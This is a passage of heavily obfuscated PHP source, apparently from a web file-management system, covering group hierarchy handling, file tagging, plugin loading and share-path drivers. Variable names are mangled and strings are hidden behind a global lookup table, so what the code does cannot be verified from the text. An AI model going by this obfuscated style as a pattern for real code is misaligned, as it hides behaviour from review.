î‰ü); } unset($··ŸƒŞÕ); } private function _listAppendSourceRoot(&$¹¨£Üİõ, $¨±à§’) { $­åñÍŸµ =& $_SERVER[§ŒØóıü]; $êâå…°Ş = Model($­åñÍŸµ[831])->listSourceRoot(SourceModel::TYPE_GROUP, $¨±à§’); $êâå…°Ş = array_to_keyvalue($êâå…°Ş, $­åñÍŸµ[496]); $êâå…°Ş = array_remove_key($êâå…°Ş, $­åñÍŸµ[496]); foreach ($¹¨£Üİõ as &$Š°¹«¡) { $Š°¹«¡[$­åñÍŸµ[87]] = $êâå…°Ş[$Š°¹«¡[$­åñÍŸµ[1862]]] ? $êâå…°Ş[$Š°¹«¡[$­åñÍŸµ[1862]]] : array(); } unset($Š°¹«¡); } protected function groupMerge($“ı¨×·Õ) { $“ı¨×·Õ = array_values(array_unique($“ı¨×·Õ)); $Òë¶ÅĞä = array(); for ($Àíä´é¶ = 0; $Àíä´é¶ < count($“ı¨×·Õ); $Àíä´é¶++) { $ØôÕÈ£‰ = !1; for ($íñ¶÷›Õ = 0; $íñ¶÷›Õ < count($“ı¨×·Õ); $íñ¶÷›Õ++) { if ($Àíä´é¶ == $íñ¶÷›Õ) { continue; } if ($this->isParentOf($“ı¨×·Õ[$íñ¶÷›Õ], $“ı¨×·Õ[$Àíä´é¶])) { $ØôÕÈ£‰ = !0; break; } } if (!$ØôÕÈ£‰) { $Òë¶ÅĞä[] = $“ı¨×·Õ[$Àíä´é¶]; } } return $Òë¶ÅĞä; } protected function isParentOf($¹ú±¤Ñ©, $ü„¹î‘Ä) { $„Š¼íİÖ =& $_SERVER[§ŒØóıü]; if (!$¹ú±¤Ñ© || !$ü„¹î‘Ä || $¹ú±¤Ñ© == $ü„¹î‘Ä) { return !1; } $ƒäê­Ü´ = $this->getInfoSimple($¹ú±¤Ñ©); $ÚÔÌª¯© = $this->getInfoSimple($ü„¹î‘Ä); $ëÙÖ£ÇÙ = $ƒäê­Ü´[$„Š¼íİÖ[511]] . $¹ú±¤Ñ© . $„Š¼íİÖ[50]; if (substr($ÚÔÌª¯©[$„Š¼íİÖ[511]], 0, strlen($ëÙÖ£ÇÙ)) == $ëÙÖ£ÇÙ) { return !0; } return !1; } public function groupShowRoot($ñãÑ£Ğ, $Ü›õÇ‹ = false) { $ë•ÃÅ‚‚ =& $_SERVER[§ŒØóıü]; $–úÏãÅ = $this->getInfo($ñãÑ£Ğ); if (!$–úÏãÅ) { return array(); } $¡×çûÜ = $this->parentLevelArray($–úÏãÅ[$ë•ÃÅ‚‚[511]]); $‚êı¦ñ = array($ñãÑ£Ğ); if (count($¡×çûÜ) == 0) { return $‚êı¦ñ; } if ($Ü›õÇ‹ && count($¡×çûÜ) == 1) { return $‚êı¦ñ; } if (!$–úÏãÅ[$ë•ÃÅ‚‚[466]] || !isset($–úÏãÅ[$ë•ÃÅ‚‚[466]][$ë•ÃÅ‚‚[1948]]) || $–úÏãÅ[$ë•ÃÅ‚‚[466]][$ë•ÃÅ‚‚[1948]] == $ë•ÃÅ‚‚[1917]) { return $this->groupShowRoot($¡×çûÜ[count($¡×çûÜ) - 1], $Ü›õÇ‹); } if ($–úÏãÅ[$ë•ÃÅ‚‚[466]][$ë•ÃÅ‚‚[1948]] == $ë•ÃÅ‚‚[357]) { $ÜŸòÙÂ = explode($ë•ÃÅ‚‚[50], $–úÏãÅ[$ë•ÃÅ‚‚[466]][$ë•ÃÅ‚‚[1949]]); if ($ÜŸòÙÂ) { $‚êı¦ñ = array_merge($‚êı¦ñ, $ÜŸòÙÂ); } } return $‚êı¦ñ; } protected function resetParentLevel() { $€òÆ©Ïü =& $_SERVER[§ŒØóıü]; $Ê÷×°Ì = $€òÆ©Ïü[1862]; $šÂ‚­ñ¯ = $this->select(); $šÂ‚­ñ¯ = array_to_keyvalue($šÂ‚­ñ¯, $Ê÷×°Ì); foreach ($šÂ‚­ñ¯ as $‚ô”Ÿ¼ë) { $›±©Ÿ™ƒ = $‚ô”Ÿ¼ë; $½’‚ğÛË = array(); while ($›±©Ÿ™ƒ[$€òÆ©Ïü[432]] != 0) { $½’‚ğÛË[] = $›±©Ÿ™ƒ[$€òÆ©Ïü[432]]; $›±©Ÿ™ƒ = $šÂ‚­ñ¯[$›±©Ÿ™ƒ[$€òÆ©Ïü[432]]]; } $½’‚ğÛË[] = 0; $½’‚ğÛË = $€òÆ©Ïü[50] . implode($€òÆ©Ïü[50], array_reverse($½’‚ğÛË)) . $€òÆ©Ïü[50]; $this->setNamePinyin($‚ô”Ÿ¼ë[$Ê÷×°Ì], $‚ô”Ÿ¼ë[$€òÆ©Ïü[32]]); $this->where(array($Ê÷×°Ì => $‚ô”Ÿ¼ë[$Ê÷×°Ì]))->save(array($€òÆ©Ïü[580] => $½’‚ğÛË)); } return $šÂ‚­ñ¯; } public function groupNameAuto($†›½‹òõ, $ÀŸÆÍ²³) { $ê…üÒÒğ =& $_SERVER[§ŒØóıü]; $òšĞ‘´¯ = $this->where(array($ê…üÒÒğ[401] => $†›½‹òõ))->getField($ê…üÒÒğ[32], !0); if (!$òšĞ‘´¯ || !in_array($ÀŸÆÍ²³, $òšĞ‘´¯)) { return $ÀŸÆÍ²³; } for ($½ĞÃ†ãÍ = 1; $½ĞÃ†ãÍ <= count($òšĞ‘´¯) + 1; $½ĞÃ†ãÍ++) { $Ä€ó¶£ = $ÀŸÆÍ²³ . "\50{$½ĞÃ†ãÍ}\51"; if (!in_array($Ä€ó¶£, $òšĞ‘´¯)) { return $Ä€ó¶£; } } } public function groupSwitch($åâÌÔàÇ, $ÎœÀÎÈ‡) { $üØ»ü¾å =& $_SERVER[§ŒØóıü]; $ªğ‡±§ñ = array($üØ»ü¾å[1862] => array($üØ»ü¾å[7], array($åâÌÔàÇ, $ÎœÀÎÈ‡))); $Ò™–â = $this->where($ªğ‡±§ñ)->select(); $Ò™–â = array_to_keyvalue($Ò™–â, $üØ»ü¾å[1862]); if (!isset($Ò™–â[$åâÌÔàÇ]) || !isset($Ò™–â[$ÎœÀÎÈ‡]) || $Ò™–â[$åâÌÔàÇ][$üØ»ü¾å[432]] == 0) { return !1; } $ªğ‡±§ñ = array($üØ»ü¾å[1862] => $åâÌÔàÇ); $¿Ê¨û´ = Model($üØ»ü¾å[1952])->where($ªğ‡±§ñ)->select(); if (!$¿Ê¨û´) { $¿Ê¨û´ = array(); } foreach ($¿Ê¨û´ as $êÕÛÚì) { $´×Ë±» = $êÕÛÚì[$üØ»ü¾å[1673]]; $ªğ‡±§ñ = array($üØ»ü¾å[1673] => $´×Ë±», $üØ»ü¾å[1862] => $ÎœÀÎÈ‡); $şªÛà‹Æ = Model($üØ»ü¾å[1952])->where($ªğ‡±§ñ)->find(); if (!$şªÛà‹Æ) { $½€”Ò• = array($ÎœÀÎÈ‡ => $êÕÛÚì[$üØ»ü¾å[1966]]); Model($üØ»ü¾å[525])->userGroupAdd($´×Ë±», $½€”Ò•); } Model($üØ»ü¾å[525])->userGroupRemove($´×Ë±», $åâÌÔàÇ); } $ªğ‡±§ñ = array($üØ»ü¾å[411] => 2, $üØ»ü¾å[432] => 0, $üØ»ü¾å[410] => 1, $üØ»ü¾å[496] => array($üØ»ü¾å[7], array($åâÌÔàÇ, $ÎœÀÎÈ‡))); $„Õüó¨ = Model($üØ»ü¾å[831])->where($ªğ‡±§ñ)->field($üØ»ü¾å[1967])->select(); $„Õüó¨ = array_to_keyvalue($„Õüó¨, $üØ»ü¾å[496], $üØ»ü¾å[402]); $ÂÚƒù¥› = !empty($„Õüó¨[$åâÌÔàÇ]) ? $„Õüó¨[$åâÌÔàÇ] : !1; if ($ÂÚƒù¥›) { if (!$„Õüó¨[$ÎœÀÎÈ‡]) { $„Õüó¨[$ÎœÀÎÈ‡] = Model($üØ»ü¾å[831])->groupRootAdd($ÎœÀÎÈ‡); } $ıÇ·˜¿Š = $„Õüó¨[$ÎœÀÎÈ‡]; $ªğ‡±§ñ = array($üØ»ü¾å[432] => $ÂÚƒù¥›); $„Õüó¨ = Model($üØ»ü¾å[831])->where($ªğ‡±§ñ)->field($üØ»ü¾å[1968])->select(); if (!$„Õüó¨) { $„Õüó¨ = array(); } Model($üØ»ü¾å[831])->moveClearAuth = !1; foreach ($„Õüó¨ as $ˆùü¬™‘) { $£èÃ… = $ˆùü¬™‘[$üØ»ü¾å[410]] == $üØ»ü¾å[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($üØ»ü¾å[831])->move($ˆùü¬™‘[$üØ»ü¾å[402]], $ıÇ·˜¿Š, $£èÃ…); } Model($üØ»ü¾å[831])->moveClearAuth = !0; $ªğ‡±§ñ = array($üØ»ü¾å[411] => 2, $üØ»ü¾å[496] => $åâÌÔàÇ); $¢ø¤š…” = array($üØ»ü¾å[496] => $ÎœÀÎÈ‡); Model($üØ»ü¾å[1969])->where($ªğ‡±§ñ)->save($¢ø¤š…”); Model($üØ»ü¾å[1970])->where($ªğ‡±§ñ)->save($¢ø¤š…”); } $this->_changeChildLevel($Ò™–â[$åâÌÔàÇ], $Ò™–â[$ÎœÀÎÈ‡], !0); $this->where(array($üØ»ü¾å[432] => $åâÌÔàÇ))->save(array($üØ»ü¾å[432] => $ÎœÀÎÈ‡)); $this->_clearChildrenCache($Ò™–â[$ÎœÀÎÈ‡]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($ÄÊÚğ›ğ) { $£êÊëı =& $_SERVER[§ŒØóıü]; return array($£êÊëı[1971] => array($ÄÊÚğ›ğ[0], $£êÊëı[1972]), $£êÊëı[1973] => array($ÄÊÚğ›ğ[0], $£êÊëı[1974])); } protected function get($¸èÙÎß¨) { $ÒÓ©¶ =& $_SERVER[§ŒØóıü]; $ÎÅÉñŸè = Model($ÒÓ©¶[512])->metaGet($¸èÙÎß¨, $ÒÓ©¶[1975]); $ª©Ú“®µ = json_decode($ÎÅÉñŸè, !0); return $ª©Ú“®µ ? $ª©Ú“®µ : array($ÒÓ©¶[1976] => $ÒÓ©¶[88], $ÒÓ©¶[369] => array()); } protected function set($ÄñÏˆÁº, $ÀÔµ…ä) { $Æ“©‰û¹ =& $_SERVER[§ŒØóıü]; $ÀÔµ…ä = $ÀÔµ…ä ? $ÀÔµ…ä : array($Æ“©‰û¹[1976] => $Æ“©‰û¹[88], $Æ“©‰û¹[369] => array()); return Model($Æ“©‰û¹[512])->metaSet($ÄñÏˆÁº, $Æ“©‰û¹[1975], json_encode($ÀÔµ…ä)); } protected function getByTagID($…äÌèÆÆ, $ì†¢•Ùğ) { $±œñÌÑ¶ =& $_SERVER[§ŒØóıü]; if (!$…äÌèÆÆ || !$ì†¢•Ùğ) { return !1; } if (!Model($±œñÌÑ¶[512])->getInfoSimple($…äÌèÆÆ)) { return !1; } $í—êŞÙ» = $this->get($…äÌèÆÆ); if (!$í—êŞÙ» || !isset($í—êŞÙ»[$±œñÌÑ¶[369]])) { return !1; } $’¹¡Á„Ç = array_find_by_field($í—êŞÙ»[$±œñÌÑ¶[369]], $±œñÌÑ¶[399], $ì†¢•Ùğ); return is_array($’¹¡Á„Ç) ? $’¹¡Á„Ç : !1; } public function listSource($ƒ®Ä±Ù…, $×•±š•½) { $‹±Šœî¾ =& $_SERVER[§ŒØóıü]; if ($×•±š•½ && !is_array($×•±š•½)) { $×•±š•½ = array($×•±š•½); } $À€€‡Ä¥ = $this->listData($ƒ®Ä±Ù…); $î€é²” = array(); foreach ($À€€‡Ä¥ as $Æ©˜åÉ—) { $åõ±çĞê = $Æ©˜åÉ—[$‹±Šœî¾[84]]; if (!$åõ±çĞê) { continue; } if (!isset($î€é²”[$åõ±çĞê])) { $î€é²”[$åõ±çĞê] = array(); } $î€é²”[$åõ±çĞê][] = $Æ©˜åÉ—[$‹±Šœî¾[426]]; } $‡»¹é›è = array(); foreach ($î€é²” as $…¡ØÇ©™ => $‡íÔ¸•Â) { $¦«ÆçÍ = !0; if (!$×•±š•½) { $‡»¹é›è[] = $…¡ØÇ©™; continue; } foreach ($×•±š•½ as $¿ËÇş‰Û) { if (!in_array($¿ËÇş‰Û, $‡íÔ¸•Â)) { $¦«ÆçÍ = !1; break; } } if ($¦«ÆçÍ) { $‡»¹é›è[] = $…¡ØÇ©™; } } if (!$‡»¹é›è) { return array(); } $òÚöäÌ‡ = array($‹±Šœî¾[417] => array($‹±Šœî¾[418], $‡»¹é›è), $‹±Šœî¾[496] => $ƒ®Ä±Ù…, $‹±Šœî¾[411] => SourceModel::TYPE_GROUP); $©æËñ§Û = Model($‹±Šœî¾[1345])->listSource($òÚöäÌ‡); if (!$©æËñ§Û || count($‡»¹é›è) == $©æËñ§Û[$‹±Šœî¾[366]][$‹±Šœî¾[367]]) { return $©æËñ§Û; } $÷ê€§Éè = array(); $ò€´œ”ö = array_to_keyvalue($©æËñ§Û[$‹±Šœî¾[82]], $‹±Šœî¾[12], $‹±Šœî¾[402]); $¸ôŞ˜£’ = array_to_keyvalue($©æËñ§Û[$‹±Šœî¾[83]], $‹±Šœî¾[12], $‹±Šœî¾[402]); $ÆÍæÓ›‹ = array_merge($¸ôŞ˜£’, $ò€´œ”ö); foreach ($‡»¹é›è as $åõ±çĞê) { if (!in_array($åõ±çĞê, $ÆÍæÓ›‹)) { $÷ê€§Éè[] = $åõ±çĞê; } } if ($÷ê€§Éè) { $this->removeBySource($ƒ®Ä±Ù…, $÷ê€§Éè); } return $©æËñ§Û; } protected function listData($÷Ï±ªøË) { $è¥Ï·ìû =& $_SERVER[§ŒØóıü]; $Í×´Û”‘ = array($è¥Ï·ìû[1664] => 0, $è¥Ï·ìû[483] => array($è¥Ï·ìû[1977], 0), $è¥Ï·ìû[422] => $è¥Ï·ìû[1978] . $÷Ï±ªøË); $Ô¡æöó = $è¥Ï·ìû[1979]; $¶Ş¶¹è = $this->field($Ô¡æöó)->where($Í×´Û”‘)->order($è¥Ï·ìû[1980])->select(); return $¶Ş¶¹è ? $¶Ş¶¹è : array(); } protected function addToTag($Â¥ÏàŒ, $ã’Óôâ, $Åªå«œÎ) { $ÆƒÉÆÇ =& $_SERVER[§ŒØóıü]; if (!$this->getByTagID($Â¥ÏàŒ, $Åªå«œÎ) || !$ã’Óôâ) { return !1; } if (!Model($ÆƒÉÆÇ[831])->pathInfo($ã’Óôâ)) { return !1; } $­¬æ §š = array($ÆƒÉÆÇ[1664] => 0, $ÆƒÉÆÇ[483] => $Åªå«œÎ, $ÆƒÉÆÇ[421] => $ã’Óôâ, $ÆƒÉÆÇ[422] => $ÆƒÉÆÇ[1981] . $Â¥ÏàŒ, $ÆƒÉÆÇ[420] => $ÆƒÉÆÇ[12], $ÆƒÉÆÇ[1866] => 0); if ($this->where($­¬æ §š)->find()) { return !1; } return $this->add($­¬æ §š); } protected function removeFromTag($ıïÚ©å–, $¦Ù¯¶ŞŒ, $²ˆô¯¬º) { $¤âåíÜÌ =& $_SERVER[§ŒØóıü]; if (!$this->getByTagID($ıïÚ©å–, $²ˆô¯¬º) || !$¦Ù¯¶ŞŒ) { return !1; } if (is_array($¦Ù¯¶ŞŒ)) { $¦Ù¯¶ŞŒ = array($¤âåíÜÌ[7], $¦Ù¯¶ŞŒ); } $÷½É¹—è = array($¤âåíÜÌ[1664] => 0, $¤âåíÜÌ[483] => $²ˆô¯¬º, $¤âåíÜÌ[422] => $¤âåíÜÌ[1981] . $ıïÚ©å–, $¤âåíÜÌ[421] => $¦Ù¯¶ŞŒ); return $this->where($÷½É¹—è)->delete(); } protected function removeByTag($øÀ‚´ö, $å´à­šö) { $õîü§ =& $_SERVER[§ŒØóıü]; if (!$this->getByTagID($øÀ‚´ö, $å´à­šö)) { return !1; } $®Ì—æÄ = array($õîü§[1664] => 0, $õîü§[483] => $å´à­šö, $õîü§[422] => $õîü§[1981] . $øÀ‚´ö); return $this->where($®Ì—æÄ)->delete(); } protected function removeBySource($Áç¦éĞƒ, $Şú»–éÅ) { $œ¸½¢·î =& $_SERVER[§ŒØóıü]; if (!$Áç¦éĞƒ || !$Şú»–éÅ) { return !1; } if (is_array($Şú»–éÅ)) { $Şú»–éÅ = array($œ¸½¢·î[7], $Şú»–éÅ); } $Ê¸¶Ë‘† = array($œ¸½¢·î[1664] => 0, $œ¸½¢·î[421] => $Şú»–éÅ, $œ¸½¢·î[483] => array($œ¸½¢·î[1020], 0), $œ¸½¢·î[422] => $œ¸½¢·î[1981] . $Áç¦éĞƒ); return $this->where($Ê¸¶Ë‘†)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\x70\154\165\x67\x69\156\114\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\163\164\141\164\x75\x73", "\162\x65\x67\151\x65\163\164", "\x63\157\156\x66\x69\x67"); public function loadList($ó·Ô»ø˜ = false) { $óØ¨í·ñ = array_to_keyvalue($this->listData(), $_SERVER[§ŒØóıü][32]); if ($ó·Ô»ø˜) { return $óØ¨í·ñ[$ó·Ô»ø˜]; } return $óØ¨í·ñ; } public function init() { $·º‡•ÛÓ =& $_SERVER[§ŒØóıü]; Hook::trigger($·º‡•ÛÓ[1982]); $‹§¿ã˜ã = $this->loadPluginList(); foreach ($‹§¿ã˜ã as $À«É’’ => $á’ŠŸÏñ) { $ô½‚‘„½ = $this->appAllow($À«É’’, $á’ŠŸÏñ); if (!$ô½‚‘„½) { continue; } foreach ($á’ŠŸÏñ[$·º‡•ÛÓ[1983]] as $±±çù³ => $ê‹­§†ã) { Hook::bind($±±çù³, $ê‹­§†ã); } } Hook::trigger($·º‡•ÛÓ[1984]); Hook::trigger(ACTION); } public function appAllow($üÖ Ø°«, $ ‚¹ìç, $¨ï¥ß = true) { $ğœÎøÃ =& $_SERVER[§ŒØóıü]; $Å¾¬Õ‡È = PLUGIN_DIR . $üÖ Ø°« . $ğœÎøÃ[1985]; if (!is_array($ ‚¹ìç) || !is_array($ ‚¹ìç[$ğœÎøÃ[1983]]) || $ ‚¹ìç[$ğœÎøÃ[755]] != 1 || !is_file($Å¾¬Õ‡È)) { return !1; } if ($GLOBALS[$ğœÎøÃ[494]] == 1) { if ($GLOBALS[$ğœÎøÃ[6]][$ğœÎøÃ[1986]] || !$GLOBALS[$ğœÎøÃ[6]][$ğœÎøÃ[1987]]) { return !0; } $¸šşòß‚ = explode($ğœÎøÃ[50], strtolower($GLOBALS[$ğœÎøÃ[6]][$ğœÎøÃ[1987]])); return in_array(strtolower($üÖ Ø°«), $¸šşòß‚) ? !1 : !0; } if ($¨ï¥ß && !Action($ğœÎøÃ[1988])->checkAuth($üÖ Ø°«)) { return !1; } return !0; } public function unInstall($­×Ú) { $“êÆâØæ =& $_SERVER[§ŒØóıü]; $Œß»ù§± = $this->loadList($­×Ú); if (file_exists(PLUGIN_DIR . $­×Ú)) { Hook::apply($­×Ú . $“êÆâØæ[1989]); } $this->remove($Œß»ù§±[$“êÆâØæ[399]]); } public function changeStatus($Şş·Ãé±, $ñŞ±úÛ†) { $´í«…ıí =& $_SERVER[§ŒØóıü]; $…ğ—Ø‡ç = $this->loadList($Şş·Ãé±); if ($ñŞ±úÛ†) { Hook::apply($Şş·Ãé± . $´í«…ıí[1990]); } $this->update($…ğ—Ø‡ç[$´í«…ıí[399]], array($´í«…ıí[1991] => $ñŞ±úÛ†)); } public function appRegist($ò€¢ª¹, $øÃ“Ã¡Í) { $›–‚«åğ =& $_SERVER[§ŒØóıü]; $‡÷Æ‡Ô¿ = $this->loadList($ò€¢ª¹); if ($‡÷Æ‡Ô¿) { $this->update($‡÷Æ‡Ô¿[$›–‚«åğ[399]], array($›–‚«åğ[1983] => $øÃ“Ã¡Í)); } else { $õ’Œú´ = array($›–‚«åğ[32] => $ò€¢ª¹, $›–‚«åğ[1983] => $øÃ“Ã¡Í, $›–‚«åğ[755] => 0, $›–‚«åğ[6] => $this->getConfigDefault($ò€¢ª¹)); $this->insert($õ’Œú´); } } public function getConfigDefault($İâæÔœ¥) { $È§úŒÒ =& $_SERVER[§ŒØóıü]; $Ç¡¡ï‚Â = array(); $ı‹‡ÊÎ = $this->getPackageJson($İâæÔœ¥); if (!$ı‹‡ÊÎ && is_array($ı‹‡ÊÎ[$È§úŒÒ[1992]])) { return $Ç¡¡ï‚Â; } foreach ($ı‹‡ÊÎ[$È§úŒÒ[1992]] as $õÏîò’ => $¿åëÎî×) { if (!isset($¿åëÎî×[$È§úŒÒ[374]]) || isset($Ç¡¡ï‚Â[$õÏîò’])) { continue; } $Ç¡¡ï‚Â[$õÏîò’] = $¿åëÎî×[$È§úŒÒ[374]]; } return $Ç¡¡ï‚Â; } public function getPackageJson($˜«©•Ù÷) { return Hook::apply($˜«©•Ù÷ . $_SERVER[§ŒØóıü][1993]); } public function getConfig($Ê’èî¶ö, $ßØ¼Ğ–à = false) { $ìÂº»€Ş =& $_SERVER[§ŒØóıü]; $Û¤ù¢¢ = array(); $“Å¢Š›ş = $this->loadList($Ê’èî¶ö); if ($“Å¢Š›ş && is_array($“Å¢Š›ş[$ìÂº»€Ş[6]])) { $Û¤ù¢¢ = $“Å¢Š›ş[$ìÂº»€Ş[6]]; } if (!$Û¤ù¢¢ || $ßØ¼Ğ–à) { $Û¤ù¢¢ = $this->getConfigDefault($Ê’èî¶ö); } return $Û¤ù¢¢; } public function setConfig($‘°´¡³È, $¾•º¦’Ñ = false) { $¼”€ü’ã =& $_SERVER[§ŒØóıü]; $ê·ÛÃ«õ = $this->loadList($‘°´¡³È); if (!$ê·ÛÃ«õ) { return !1; } $‹–Šäª× = $ê·ÛÃ«õ[$¼”€ü’ã[6]]; if ($¾•º¦’Ñ == !1) { $‹–Šäª× = array(); $¾•º¦’Ñ = $this->getConfigDefault($‘°´¡³È); } foreach ($¾•º¦’Ñ as $Öù‹©ÒÇ => $Òš­·¡Ë) { $‹–Šäª×[$Öù‹©ÒÇ] = is_string($Òš­·¡Ë) ? trim($Òš­·¡Ë) : $Òš­·¡Ë; } $this->update($ê·ÛÃ«õ[$¼”€ü’ã[399]], array($¼”€ü’ã[6] => $‹–Šäª×)); } public function viewList() { $Æ­ö×˜ =& $_SERVER[§ŒØóıü]; $àÏŞ¶›è = $this->loadList(); $this->pluginScan($àÏŞ¶›è); $àÏŞ¶›è = $this->loadPluginList(); $´ªüš¦Ø = array(); foreach ($àÏŞ¶›è as $‰Š÷ŠĞÇ => $õšß×€Î) { unset($õšß×€Î[$Æ­ö×˜[1983]], $õšß×€Î[$Æ­ö×˜[6]]); $ª–Ãü«ü = PLUGIN_DIR . $õšß×€Î[$Æ­ö×˜[32]] . $Æ­ö×˜[1985]; if (!is_file($ª–Ãü«ü)) { continue; } $õÊÉó°Â = Hook::apply($õšß×€Î[$Æ­ö×˜[32]] . $Æ­ö×˜[1993]); if (is_array($õÊÉó°Â)) { $´ªüš¦Ø[$‰Š÷ŠĞÇ] = array_merge($õšß×€Î, $õÊÉó°Â); } } return $´ªüš¦Ø; } private function loadPluginList() { $×Á¤½Óò =& $_SERVER[§ŒØóıü]; $Õ¼¦¾½· = $this->loadList(); if (strtolower(MOD) == $×Á¤½Óò[1994]) { return $Õ¼¦¾½·; } $ı—¯Æ§µ = Hook::trigger($×Á¤½Óò[1995], $Õ¼¦¾½·); if ($Õ¼¦¾½· && !$ı—¯Æ§µ) { die; } return $ı—¯Æ§µ ? $ı—¯Æ§µ : $Õ¼¦¾½·; } private function pluginScan($¿ÄÔãÕÙ) { $ş°«ÙÁ =& $_SERVER[§ŒØóıü]; recursion_dir(PLUGIN_DIR, $—¥…öÉË, $ğ½ÛÚ”‚, 0); foreach ($—¥…öÉË as $—í«‰¼Ô) { $·ÚŸû¾º = get_path_this($—í«‰¼Ô); if (isset($¿ÄÔãÕÙ[$·ÚŸû¾º]) || !file_exists($—í«‰¼Ô . $ş°«ÙÁ[1996]) || !file_exists($—í«‰¼Ô . $ş°«ÙÁ[1985])) { continue; } Hook::apply($·ÚŸû¾º . $ş°«ÙÁ[1990]); } } } goto c¬¤äÔç£„; DÇ§ÆÏå—ê: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ı´šûø) { $this->pathParse = $ı´šûø; $this->model = Model($_SERVER[§ŒØóıü][1345]); } public function getPathOuter($Ã¸ –å) { $™¢¨ÁÊ =& $_SERVER[§ŒØóıü]; if (!$Ã¸ –å) { return $Ã¸ –å; } $»¢á¬„š = $this->parse($Ã¸ –å); return trim(KodIO::makeShare($this->pathParse[$™¢¨ÁÊ[399]], $»¢á¬„š[$™¢¨ÁÊ[399]]), $™¢¨ÁÊ[8]); } protected function infoParse($óÆÓà , $ú§¹³ˆ = false, $Ô‚®ÊÜŠ = false) { $’ß®¯Õù =& $_SERVER[§ŒØóıü]; $Ë¢ò°ë™ = $this->pathParse[$’ß®¯Õù[399]]; $é­¬ò³ = trim($this->pathParse[$’ß®¯Õù[1174]], $’ß®¯Õù[8]); return Action($’ß®¯Õù[1353])->sharePathInfo($Ë¢ò°ë™, $é­¬ò³, $ú§¹³ˆ); } public function infoFull($£™…ô§¦) { $¿İú–ë =& $_SERVER[§ŒØóıü]; $³ÊÀşë‘ = explode($¿İú–ë[8], trim($£™…ô§¦, $¿İú–ë[8])); if (count($³ÊÀşë‘) > 1) { $¶ØùÎä¢ = implode($¿İú–ë[8], array_splice($³ÊÀşë‘, 1)); $ºÜ“ôì¯ = $this->model->pathInfoByPath($³ÊÀşë‘[0], $¶ØùÎä¢); if (!$ºÜ“ôì¯) { return !1; } $this->pathParse[$¿İú–ë[1174]] = $ºÜ“ôì¯[$¿İú–ë[402]]; } return $this->infoParse($£™…ô§¦); } public function listAll($Ì»ÍÓÔû) { $ÌÕˆıš… =& $_SERVER[§ŒØóıü]; $ÒÙí´¹ = IO::info($this->pathParse[$ÌÕˆıš…[84]]); if (!$ÒÙí´¹) { return array(); } $“ï´‰‘Ù = $this->model->listAll($Ì»ÍÓÔû); $ç¦òàîÔ = Model($ÌÕˆıš…[592])->getInfo($ÒÙí´¹[$ÌÕˆıš…[593]]); foreach ($“ï´‰‘Ù as &$¢ò”šĞé) { check_abort(); $¢ò”šĞé[$ÌÕˆıš…[87]] = Action($ÌÕˆıš…[1353])->_shareItemeParse($¢ò”šĞé[$ÌÕˆıš…[87]], $ç¦òàîÔ); } unset($¢ò”šĞé); return $“ï´‰‘Ù; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ñô›·) { $this->pathParse = $ñô›·; $this->model = Model($_SERVER[§ŒØóıü][1345]); } protected function infoParse($ÙÂ½—­‰, $¾™Ñ˜Ì = false, $œ¥õĞ§ = false) { $Êº¯©• =& $_SERVER[§ŒØóıü]; return Action($Êº¯©•[1180])->sharePathInfo($this->pathParse[$Êº¯©•[84]], !0, $¾™Ñ˜Ì); } public function listPath($æãäéİ, $Ìƒ³ÔÍˆ = false) { $ì …º® =& $_SERVER[§ŒØóıü]; $‡öÁ¥ê÷ = parent::listPath($æãäéİ, $Ìƒ³ÔÍˆ); if (!$‡öÁ¥ê÷) { return $‡öÁ¥ê÷; } if (is_array($‡öÁ¥ê÷[$ì …º®[1354]])) { $‡öÁ¥ê÷[$ì …º®[1354]] = Action($ì …º®[1180])->shareItemInfo($‡öÁ¥ê÷[$ì …º®[1354]]); } foreach ($‡öÁ¥ê÷ as $å„ûÔ†Ù => $ÕÁ€ò‚ß) { if (!in_array($å„ûÔ†Ù, array($ì …º®[83], $ì …º®[82]))) { continue; } foreach ($ÕÁ€ò‚ß as $’ÜÕ‘œå => $§ÎœâÉï) { $‡öÁ¥ê÷[$å„ûÔ†Ù][$’ÜÕ‘œå] = Action($ì …º®[1180])->shareItemInfo($§ÎœâÉï); } } return $‡öÁ¥ê÷; } public function listAll($–óŠƒ”ù) { $Œ’öÜ‡ù =& $_SERVER[§ŒØóıü]; $éÕä¹è÷ = IO::info($this->pathParse[$Œ’öÜ‡ù[84]]); if (!$éÕä¹è÷) { return array(); } $ò©±ÔöÂ = $this->model->listAll($–óŠƒ”ù); foreach ($ò©±ÔöÂ as &$š‡ÂÈÅ¤) { $š‡ÂÈÅ¤[$Œ’öÜ‡ù[87]] = Action($Œ’öÜ‡ù[1180])->shareItemInfo($š‡ÂÈÅ¤[$Œ’öÜ‡ù[87]]); } unset($š‡ÂÈÅ¤); return $ò©±ÔöÂ; } } class PathDriverDriverShareItem { public function __construct($ „¸Òò) { $this->pathParse = $ „¸Òò; } public function __call($­÷º™òí, $©ıôŞê) { $—¦Ä¨‹€ =& $_SERVER[§ŒØóıü]; if (method_exists($this, $­÷º™òí)) { return; } $¨¡ˆñÀ˜ = call_user_func_array(array($—¦Ä¨‹€[1355], $­÷º™òí), $©ıôŞê); $‘´¿Õİü = array($—¦Ä¨‹€[1356], $—¦Ä¨‹€[1357], $—¦Ä¨‹€[1358], $—¦Ä¨‹€[1359], $—¦Ä¨‹€[546], $—¦Ä¨‹€[548], $—¦Ä¨‹€[1360], $—¦Ä¨‹€[107], $—¦Ä¨‹€[1361], $—¦Ä¨‹€[1362]); if (in_array($­÷º™òí, $‘´¿Õİü)) { $¨¡ˆñÀ˜ = $this->getPathOuter($¨¡ˆñÀ˜); } return $¨¡ˆñÀ˜; } public function copy($¿û·¬Ğ­, $¦òÓë™, $ıÎîÃÛ = false, $†¨ºøõ­ = false) { return $this->copyMove($¿û·¬Ğ­, $¦òÓë™, $ıÎîÃÛ, $_SERVER[§ŒØóıü][546], $†¨ºøõ­); } public function move($µôÄíòÏ, $ù„·ñ±±, $íĞ™ÀĞÃ = false, $ŞëÈ•Éê = false) { return $this->copyMove($µôÄíòÏ, $ù„·ñ±±, $íĞ™ÀĞÃ, $_SERVER[§ŒØóıü][548], $ŞëÈ•Éê); } private function copyMove($ì¯ÕÏïİ, 